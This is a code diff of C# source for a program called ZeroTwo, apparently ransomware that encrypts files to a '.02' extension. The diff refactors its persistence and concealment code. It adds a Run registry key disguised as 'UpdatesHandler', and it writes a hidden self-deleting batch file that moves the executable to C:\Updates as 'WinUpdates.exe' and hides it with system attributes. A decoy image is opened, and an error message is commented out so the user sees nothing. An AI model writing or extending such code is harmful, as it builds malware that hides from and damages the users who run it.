@@ -9,6 +9,11 @@ namespace ZeroTwo.src {
     class ZeroTwo {
         private const string EXT = ".02";
 
+        private const string WORKDIR = "C:\\Updates";
+        private const string BAT_NAME = "subs.bat";
+        private const string REG_KEY = "UpdatesHandler";
+        private const string EXE_NAME = "WinUpdates.exe";
+
         private const int ENC = 0;
         private const int DEC = 1;
 
@@ -29,7 +34,7 @@ namespace ZeroTwo.src {
 
         private static void Inject() {
             RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-            key.SetValue("UpdatesHandler", "C:\\Updates\\WinUpdates.exe 0");
+            key.SetValue(REG_KEY, WORKDIR + "\\" + EXE_NAME + " " + ENC);
             key.Close();
         }
 
@@ -40,7 +45,6 @@ namespace ZeroTwo.src {
             string exeFolder = exePath.Substring(0, index);
             string exeName = Process.GetCurrentProcess().ProcessName;
             string imagePath = (exeFolder + "\\" + exeName + ".jpg").Replace("/", "\\");
-
             try {
                 if (File.Exists(imagePath))
                     File.Delete(imagePath);
@@ -58,30 +62,28 @@ namespace ZeroTwo.src {
                     }
                 }
                 Process.Start(imagePath);
-            } catch (Exception ex) {
-                throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
+            } catch (Exception) {
+                //throw new Exception(string.Format("Can't extract resource '{0}' to file '{1}': {2}", imageRes, imagePath, ex.Message), ex);
             }
         }
 
         private static void Subs() {
             string batchCommands = string.Empty;
-            string destFolder = "C:\\Updates";
             string exePath = Assembly.GetExecutingAssembly().CodeBase.Replace("file:///", string.Empty).Replace("/", "\\");
 
-            batchCommands += "@ECHO OFF\n";                        
-            batchCommands += "ping 127.0.0.1 > nul\n";             
-            batchCommands += "echo j | mkdir " + "\"" + destFolder + "\"" + "\n";                   
-            batchCommands += "echo j | move ";                   
-            batchCommands += "\"" + exePath + "\"" + " " + "\"" + destFolder + "\\WinUpdates.exe" + "\"" + "\n";
-            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\"" + "\n";
-            batchCommands += "echo j | attrib +h +s " + "\"" + destFolder + "\\" + "WinUpdates.exe" + "\"" + "\n";
-            batchCommands += "echo j | del /F /Q " + "\"" + "C:\\tmp02" + "\"";
+            batchCommands += "@ECHO OFF\n";
+            batchCommands += "ping 127.0.0.1 > nul\n";
+            batchCommands += "echo j | move ";
+            batchCommands += "\"" + exePath + "\"" + " " + "\"" + WORKDIR + "\\" + EXE_NAME + "\"" + "\n";
+            batchCommands += "echo j | attrib +h +s " + "\"" + WORKDIR + "\"" + "\n";
+            batchCommands += "echo j | attrib +h +s " + "\"" + WORKDIR + "\\" + EXE_NAME + "\"" + "\n";
+            batchCommands += "echo j | del /F /Q " + "\"" + WORKDIR + "\\" + BAT_NAME + "\"";
 
-            Directory.CreateDirectory("C:\\tmp02");
-            File.WriteAllText("C:\\tmp02\\subs.bat", batchCommands);
+            Directory.CreateDirectory(WORKDIR);
+            File.WriteAllText(WORKDIR + "\\" + BAT_NAME, batchCommands);
 
             Process p = new Process();
-            p.StartInfo.FileName = "C:\\tmp02\\subs.bat";
+            p.StartInfo.FileName = WORKDIR + "\\" + BAT_NAME;
             p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             p.Start();
         }
